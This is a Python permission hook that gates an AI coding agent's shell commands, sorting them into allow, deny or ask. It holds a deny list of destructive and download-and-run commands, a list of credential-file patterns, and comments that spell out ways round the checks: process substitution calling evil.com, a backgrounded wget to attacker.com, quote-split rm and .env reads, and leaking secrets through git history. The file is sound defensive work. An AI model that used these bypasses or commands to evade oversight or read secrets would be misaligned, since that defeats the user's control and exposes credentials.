#!/usr/bin/env python3
"""PreToolUse hook: programmatic permission decisions for Bash commands.

WHY PreToolUse, not PermissionRequest (SEC-03, 2026-07-18): this hook was
originally registered under the PermissionRequest event. Per the official
docs (code.claude.com/docs/en/hooks, verified via WebFetch, not assumed),
PermissionRequest fires "When a permission dialog appears". hooks/
settings.json has "Bash(*)" unconditionally in permissions.allow -- a
static rule that auto-approves every Bash command with NO dialog ever
shown. Since PermissionRequest only fires when a dialog is about to
appear, it NEVER fired for any Bash command under this repo's own config
-- every rule below, including the SEC-01 pytest/npm-test "ask" fix and
the entire DANGEROUS_PATTERNS deny list, was dead code the whole time
Bash(*) has been in the allow list.

PreToolUse hooks fire on every tool call unconditionally, before
permission rules are evaluated, and CAN override a matching allow rule --
the permissions doc gives this exact scenario as the recommended pattern:
"add `Bash` to your allow list and register a PreToolUse hook that
rejects those specific commands" (code.claude.com/docs/en/permissions).
emit_permission_decision(deny) blocks the call outright even under
Bash(*); "ask" forces the confirmation prompt the same way. Read-only
tools are always safe, explicitly dangerous Bash commands are denied,
everything else that isn't an established safe prefix asks the user.
"""

import re

from utils import (
    emit_permission_decision,
    get_tool_input,
    hook_main,
    parse_stdin,
    shell_statement_tokens,
)

ALWAYS_SAFE_TOOLS: tuple[str, ...] = (
    "Read",
    "Glob",
    "Grep",
    "Task",
    "TaskCreate",
    "TaskUpdate",
    "TaskList",
    "TaskGet",
    "WebSearch",
    "WebFetch",
)

# WHY pytest/python -m pytest/npm test/npm run test/npm run lint are NOT
# here (SEC-01, external security audit 2026-07-17): these commands EXECUTE
# repository-defined code, not just read it. pytest imports conftest.py,
# fixtures, and plugins from the working tree before running a single test;
# `npm test`/`npm run <script>` runs whatever arbitrary shell command
# package.json's "scripts" section defines -- there is no way to know in
# advance that it is actually a test runner and not `"test": "curl evil |
# bash"`. Auto-allowing these by prefix match let a malicious conftest.py or
# package.json test/lint script execute with the user's privileges with zero
# confirmation the moment an agent ran "the tests" in an untrusted repo --
# the prefix match also collided on any command merely STARTING WITH these
# names (e.g. a `pytest-malicious` executable on PATH). ruff/mypy stay below:
# both are pure static analyzers that parse source without executing it.
SAFE_BASH_PREFIXES: tuple[str, ...] = (
    "git status",
    "git log",
    "git diff",
    "git branch",
    "git show",
    "ruff",
    "mypy",
    "ls",
    "pwd",
    "cat ",
    "head ",
    "tail ",
    "wc ",
    "echo ",
    "which ",
    "python --version",
    "node --version",
)

# WHY (HIGH, external security audit 2026-07-07, independently confirmed): a
# read-only shell command is not automatically a SAFE one to auto-allow --
# `cat ~/.ssh/id_rsa` or `cat .env` starts with the auto-allowed "cat "
# prefix, has no chain operator, and would disclose real secrets straight
# into Claude's context with zero user confirmation. Same denylist shape
# already used by pre_commit_guard.py's staged-secrets check, extended with
# a few more common credential-file names relevant to a READ (not commit)
# context.
SENSITIVE_PATH_PATTERNS: tuple[str, ...] = (
    ".env",
    ".ssh",
    "id_rsa",
    "id_ed25519",
    "id_ecdsa",
    "credentials",
    ".pem",
    ".key",
    ".npmrc",
    ".netrc",
    ".aws",
    ".git-credentials",
    "known_hosts",
    "secret",
    "token",
    "password",
    "gh/hosts",  # GitHub CLI's OAuth token file (~/.config/gh/hosts.yml)
    ".docker/config",  # Docker registry auth
    ".kube/config",  # Kubernetes cluster credentials
    ".pgpass",
    "shadow",
)

# WHY these four: they are the read-only prefixes in SAFE_BASH_PREFIXES
# that take an arbitrary file path argument. "echo "/"ls"/"pwd"/etc. don't
# read file CONTENT the way cat/head/tail/wc do. `wc -l .env` or
# `wc -c ~/.ssh/id_rsa` leaks byte/line/word counts of a sensitive file's
# content without needing the "cat "/"head "/"tail " gate at all (security
# audit 2026-07-12, F-16).
_PATH_SENSITIVE_READ_PREFIXES: tuple[str, ...] = ("cat ", "head ", "tail ", "wc ")


# WHY (MEDIUM, self-audit 2026-08-22 during a hook-control-matrix build):
# `cmd_lower.startswith(prefix)` has no word-boundary check. Prefixes that
# already end in a space ("cat ", "echo ") are safe by construction -- a
# collision would need a literal space in the colliding name. But "ruff",
# "mypy", "ls", "pwd", "git status", "git log", "git diff", "git branch",
# "git show", "python --version", "node --version" do NOT end in a space,
# so a same-prefix different-command match (a `ruffian` wrapper script, a
# `lsof` invocation, a `pwd123` executable planted on PATH) auto-allows on
# nothing more than sharing a prefix -- the exact bypass class SEC-01
# (2026-07-17) already removed pytest/npm-test for, just not extended to
# these. Fixed generally: require the match end at a word boundary (end of
# string or a following space), not merely be a leading substring.
def _matches_safe_prefix(cmd_lower: str, prefix_lower: str) -> bool:
    """True if cmd_lower starts with prefix_lower AND the prefix match ends
    at a word boundary. `lsof ...` must NOT match "ls"; `ruffian` must NOT
    match "ruff"; `ls -la` and `ruff check .` (space right after) still do."""
    if not cmd_lower.startswith(prefix_lower):
        return False
    if prefix_lower.endswith(" "):
        return True
    tail = cmd_lower[len(prefix_lower) :]
    return tail == "" or tail[0] == " "


def _dequote(cmd_lower: str) -> str:
    """Quote-splitting-proof scan text for pattern-substring checks only.

    WHY (closes the last documented residual gap, falsification-pilot
    20260824; refactored the same day onto the shared `shell_command_tokens`
    utility in `hooks/lib/security.py` instead of this function's original
    ad-hoc `.replace("'", "").replace('"', "")` patch, once a repo-wide sweep
    found two OTHER hooks had independently needed the identical fix): a
    literal `pattern in cmd_lower` scan is not real shell tokenization. Bash
    concatenates adjacent quoted/unquoted fragments into one word, so
    `git show HEAD:'.e'nv` and `git show HEAD:.env` execute identically --
    confirmed byte-for-byte in a throwaway repo -- but only the second
    contains ".env" as a literal substring, so the sensitive-path scan
    missed the first entirely (auto-ALLOW). The same technique degrades
    DANGEROUS_PATTERNS from "deny" to a bare "ask": `rm -r'f' /` no longer
    contains "rm -rf" as a substring (independently reproduced before this
    fix). Real tokenization (`shlex.split(posix=True)`, already proven
    correct in `pre_commit_guard.py`) reconstructs quote-split words exactly
    as bash would, which a blind character-strip only approximated. Joining
    tokens with a single space is still a safe superset scan relative to the
    raw command for substring membership -- it cannot hide a pattern that
    was there unquoted, only reveal one that quote-splitting had hidden.

    WHY `shell_statement_tokens` (plain shlex on the whole string), NOT
    `shell_command_tokens` (which also chain-splits on `&&`/`||`/`;`/`|`/`&`
    first): several DANGEROUS_PATTERNS entries are themselves defined around
    a chain operator (`"curl | bash"`, `"wget | bash"`) -- chain-splitting
    before the scan would separate exactly the substring those patterns
    need to match, turning a `deny` into an `ask` (caught by this file's own
    test suite, `test_curl_pipe_bash_blocked`, on first attempt with the
    chain-splitting variant). Quote-splitting protection alone doesn't need
    statement-splitting; `shlex.split` already reconstructs quote-split
    words while leaving `|`/`&`/`;` as their own literal tokens.

    Deliberately NOT applied to prefix-matching
    (_matches_safe_prefix/SAFE_BASH_PREFIXES) or CHAIN_OPERATORS: obfuscating
    a SAFE prefix this way only prevents it from matching, which pushes the
    command toward the safe "ask" default, not toward "allow" -- no
    vulnerability in that direction, no reason to touch that logic.
    """
    return " ".join(shell_statement_tokens(cmd_lower))


def _reads_sensitive_path(cmd_lower: str) -> bool:
    """True if a cat/head/tail/wc — or a git-history read — command's target
    path looks like a secret.

    WHY the git branch (falsification-pilot 20260824, paraphrase-sensitivity
    probe): `git show HEAD:.env`, `git log -p .env`, `git diff HEAD~1 -- .env`
    all dump full file content -- including from commits no longer in the
    working tree -- but were routed through the "git show"/"git log"/"git
    diff" SAFE_BASH_PREFIXES entries, never reaching this function at all.
    Same failure shape as F-16 (wc missing the cat/head/tail gate): a
    content-reading safe-prefix the sensitive-path check didn't know about.
    """
    cmd_scan = _dequote(cmd_lower)
    for prefix in _PATH_SENSITIVE_READ_PREFIXES:
        if cmd_lower.startswith(prefix):
            return any(pattern in cmd_scan for pattern in SENSITIVE_PATH_PATTERNS)

    # WHY (security-audit follow-up, same pilot): a filename-substring scan
    # only catches `git show <ref>:<path>` -- it says nothing about `git show
    # <ref>` with NO ":<path>", which defaults to dumping the FULL commit
    # patch (every changed file, including ones never named in the command
    # text). Reproduced live: `git show HEAD~1` alone printed a secret from a
    # since-removed .env with zero filename anywhere in the command. Route
    # any unrestricted "git show <ref>" to "ask" -- there is no way to bound
    # what such a command touches from the command string alone.
    if cmd_lower.startswith("git show ") and ":" not in cmd_lower:
        return True

    # `git log` defaults to metadata-only (safe); `-p`/`--patch`/`-u` switch
    # it to full per-commit patches, the same unrestricted-content-dump risk
    # as bare `git show` above. Word-boundary check so "-parent"-style flags
    # (if any existed) wouldn't false-positive; none currently do, kept for
    # robustness against future flag additions.
    if cmd_lower.startswith("git log ") and re.search(r"(^|\s)(-p|--patch|-u)(\s|$)", cmd_lower):
        return True

    # WHY (human decision, 20260824, closing the last gap in this class):
    # `git diff <ref(s)>` with no `-- <path>` restriction defaults to a full
    # multi-file patch, identical risk to bare `git show`/`git log -p` above
    # -- reproduced live leaking a historical secret via `git diff HEAD~1
    # HEAD` with no filename anywhere in the command. This deliberately
    # changes a previously-tested contract (`git diff HEAD` used to auto-
    # allow); accepted confirmation friction on a common command in
    # exchange for closing a demonstrated secret-leak path. `-- <path>`
    # restricts scope, so it's still scanned for sensitivity rather than
    # blanket-asked.
    if cmd_lower.startswith("git diff "):
        if " -- " in cmd_lower:
            return any(pattern in cmd_scan for pattern in SENSITIVE_PATH_PATTERNS)
        return True

    for prefix in ("git show ", "git log "):
        if cmd_lower.startswith(prefix):
            return any(pattern in cmd_scan for pattern in SENSITIVE_PATH_PATTERNS)
    return False


DANGEROUS_PATTERNS: tuple[str, ...] = (
    "rm -rf",
    "rm -r -f",
    "DROP TABLE",
    "DROP DATABASE",
    "TRUNCATE TABLE",
    "DELETE FROM",
    "git push --force",
    "git push -f",
    "git reset --hard",
    "git clean -fd",
    "chmod 777",
    "chmod a+rwx",
    "format C:",
    "format D:",
    "del /s /q",
    "rmdir /s /q",
    "npm publish",
    "pip install --break-system-packages",
    "curl | bash",
    "curl | sh",
    "wget | bash",
    "wget | sh",
    "sudo ",
    "mkfs",
    "dd if=",
    "> /dev/sd",
    "python -c",
    "python3 -c",
    "base64 -d",
    "base64 --decode",
    "powershell -enc",
    "powershell -e ",
    "certutil -urlcache",
    "reg delete",
    "shutdown",
    "reboot",
    "kill -9",
    "killall",
    "nohup",
)

# WHY a dedicated regex instead of a bare "eval " entry in DANGEROUS_PATTERNS
# (2026-07-23, real, reproduced false positives -- not hypothetical): a plain
# substring check for "eval " (with trailing space) blocked any Bash command
# whose TEXT happened to contain an unrelated word followed by a space, e.g.
# "--ignore=tests/boyko_eval 2>&1" (a directory name) or a commit message
# containing the English phrase "Boyko Agent eval suite" -- both hit in one
# real session. A bare `\beval\b` word-boundary fix is NOT sufficient on its
# own: "eval suite" still has genuine word boundaries on both sides of
# "eval", so `\beval\b` would still incorrectly flag it. The actual signal
# that distinguishes a genuine dangerous invocation from English prose is
# POSITION: a real `eval` command must be at the start of the command string
# or immediately after a shell command-separator (;, &, |, backtick, newline)
# or a `$(` subshell open -- "eval" appearing in the middle of a sentence,
# preceded by an ordinary word and space, is never a command invocation.
# Verified this still catches the dangerous shapes ("eval $(curl ...)",
# "echo x; eval $(...)", "curl ... | eval") while no longer matching either
# reproduced false positive.
_EVAL_COMMAND_RE = re.compile(r"(?:^|[;&|`\n]|\$\()\s*eval\b", re.IGNORECASE)

# WHY: shell metacharacters indicate command chaining — a "safe" prefix
# followed by && or | can execute arbitrary commands after the safe one.
# WHY ">" is here too: redirection is a write operation, not just chaining,
# but the same "any of these chars disqualifies auto-allow" gate covers it
# correctly. Without it, "echo payload > .env" auto-approved via the "echo "
# safe prefix, since redirection was never treated as unsafe — a single ">"
# substring check also catches "1>", "2>", and ">>" variants for free.
# WHY "<" (SEC-04, external review 2026-07-22, verified by direct decide()
# calls before this fix): process substitution "<(...)" runs an ARBITRARY
# command and feeds its stdout to the outer command — "cat <(curl evil.com/x
# .sh)" starts with the auto-allowed "cat " prefix, contains no operator that
# was in this tuple, and matched no SENSITIVE_PATH_PATTERNS substring, so it
# returned "allow" with zero confirmation despite running curl. Verified
# empirically: with "<" absent, decide("Bash", {"command": "cat <(curl
# evil.com/x.sh)"}) == ("allow", ...); after adding "<", the same call falls
# through to the chain-operator "ask" branch like ">" already does. A bare
# "<" substring also catches heredocs ("<<", "<<<") and simple input
# redirection ("cat < file") for free, same as ">" already covers ">>"/"1>"/
# "2>". NOTE: this does NOT fix the separate, pre-existing gap where "cat
# some-generic-filename" (no "<" at all) already auto-allows because
# SENSITIVE_PATH_PATTERNS only matches known secret-ish substrings, not
# arbitrary filenames — verified that gap exists identically with or without
# "<", so it is a SAFE_BASH_PREFIXES/SENSITIVE_PATH_PATTERNS design
# limitation, not something this specific fix claims to close.
# WHY "&" (SEC-05, adversarial review 2026-08-22 of the word-boundary fix
# above): a bare background operator was missing. `ls & wget attacker.com/x`
# passes every earlier check -- no "&&", no pipe, no dangerous substring --
# then matches the "ls" safe prefix (boundary check admits the following
# space) and auto-ALLOWS, while Bash still runs `wget` in the foreground.
# A substring check on "&" catches both bare "&" and "&&" for free, the same
# trick ">" already uses for ">>"/"1>"/"2>" and "<" for "<<"/"<<<".
CHAIN_OPERATORS: tuple[str, ...] = ("&&", "||", ";", "|", "`", "$(", "\n", ">", "<", "&")


def decide(tool_name: str, tool_input: dict) -> tuple[str, str]:
    """Return (behavior, message) tuple."""
    # WHY: read-only tools never modify state — safe to auto-approve
    if tool_name in ALWAYS_SAFE_TOOLS:
        return ("allow", "")

    if tool_name == "Bash":
        command = tool_input.get("command", "")
        cmd_lower = command.lower().strip()
        cmd_scan = _dequote(cmd_lower)

        # WHY: check dangerous first — deny takes priority over allow
        # WHY cmd_scan (dequoted), not cmd_lower: `rm -r'f' /` degrades this
        # deny to a bare "ask" under a raw substring scan -- independently
        # reproduced before this fix. See _dequote's docstring.
        for pattern in DANGEROUS_PATTERNS:
            if pattern.lower() in cmd_scan:
                return ("deny", f"Blocked dangerous command: {pattern}")

        if _EVAL_COMMAND_RE.search(command):
            return ("deny", "Blocked dangerous command: eval")

        # WHY: any command with chaining operators is not safe to auto-approve,
        # even if it starts with a safe prefix like "git status && rm -rf /"
        for op in CHAIN_OPERATORS:
            if op in command:
                return ("ask", "")

        # WHY checked before the safe-prefix loop below: cat/head/tail are
        # "safe" prefixes for ordinary files, but reading a secret is not
        # made safe just because the read itself has no side effects.
        if _reads_sensitive_path(cmd_lower):
            return ("ask", "")

        # WHY: safe bash prefixes are read-only or standard dev tools
        # Only checked AFTER chain operators are excluded
        for prefix in SAFE_BASH_PREFIXES:
            if _matches_safe_prefix(cmd_lower, prefix.lower()):
                return ("allow", "")

    # WHY: default to asking — explicit user consent for unknown operations
    return ("ask", "")


def main() -> None:
    data = parse_stdin()
    if not data:
        return

    tool_name = data.get("tool_name", data.get("tool", ""))
    tool_input = get_tool_input(data)

    behavior, message = decide(tool_name, tool_input)

    # WHY emit_permission_decision, not a hand-built PermissionRequest JSON:
    # this is now a PreToolUse hook, whose SDK-documented output field is
    # hookSpecificOutput.permissionDecision (see utils.py's
    # emit_permission_decision docstring), not PermissionRequest's
    # decision.behavior shape.
    emit_permission_decision(decision=behavior, reason=message)


if __name__ == "__main__":
    # WHY fail_closed=True: this hook's job is to deny dangerous Bash
    # commands (rm -rf, curl|bash, DROP TABLE, ...) -- same category as
    # input_guard.py/mcp_response_guard.py/pre_commit_guard.py, which all
    # fail closed on crash/timeout per utils.hook_main's own rationale.
    # Failing open here would silently let exactly the commands this hook
    # exists to block through if the hook itself crashed or hung.
    hook_main(main, fail_closed=True)
